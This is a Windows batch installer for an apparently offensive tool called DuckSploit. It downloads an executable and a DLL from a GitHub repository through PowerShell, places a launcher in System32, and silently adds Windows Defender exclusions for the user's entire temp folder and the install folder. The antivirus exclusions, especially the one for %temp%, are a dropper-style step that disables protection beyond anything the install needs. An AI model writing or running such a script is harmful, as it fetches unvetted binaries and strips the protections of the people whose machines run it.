@echo off
REM 4re5 group - 2024

set version=%1

mkdir %USERPROFILE%\DuckSploit
cls
echo Downloading...
powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/versions/ds-%version%.exe', '%USERPROFILE%\DuckSploit\ds.exe')
powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/images/icon.ico?raw=true', '%USERPROFILE%\DuckSploit\icon.ico')
powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/Mono.Nat.dll?raw=true', '%USERPROFILE%\DuckSploit\Mono.Nat.dll')

powershell Add-MpPreference -ExclusionPath "%temp%"
powershell Add-MpPreference -ExclusionPath "%userprofile%\DuckSploit\"

(
echo @echo off
echo REM 4re5 group - 2024
echo call %USERPROFILE%\DuckSploit\ds.exe
)>"%windir%\System32\ds.bat"

cls

echo DuckSploit V%version% is now downloaded
echo Type "ds" in your terminal to launch DuckSploit
